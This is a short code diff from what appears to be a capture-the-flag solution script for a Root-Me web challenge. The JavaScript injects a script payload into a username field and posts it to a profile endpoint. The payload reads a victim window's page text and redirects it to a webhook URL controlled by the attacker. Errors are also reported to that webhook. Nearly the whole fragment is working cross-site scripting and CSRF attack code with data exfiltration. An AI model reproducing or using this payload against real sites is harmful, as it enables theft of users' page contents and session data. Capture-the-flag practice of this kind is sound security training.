@@ -31,10 +31,10 @@ const profile = window.open("", "rootme");
 window.location = "${WEBHOOK}?" + profile.document.body.innerText;
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
-  document.getElementById("login").submit();
-  post(WEBHOOK, "csrfed");
+  // document.getElementById("login").submit();
+  post(PROFILE, `username=<script>${payload}</script>&sercret=toto`);
 
-  setTimeout(() => imgEnd(), 4000);
+  imgEnd();
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
